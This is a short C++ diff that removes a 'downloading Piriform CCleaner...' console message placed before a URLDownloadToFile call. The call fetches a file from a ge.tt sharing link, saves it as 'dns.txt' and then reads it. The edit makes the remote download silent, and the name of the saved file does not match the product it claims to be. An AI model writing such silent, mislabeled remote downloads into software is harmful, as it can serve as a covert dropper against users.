@@ -14,7 +14,6 @@ int main()
 	const TCHAR url[] = _T("http://ge.tt/api/1/files/77h0hRR2/0/blob?download");
 	const TCHAR location[] = _T("dns.txt");
 
-	cout << "downloading Piriform CCleaner...";
 	HRESULT hr = URLDownloadToFile(NULL, url, location, 0, NULL);
 
 	std::ifstream file("dns.txt");
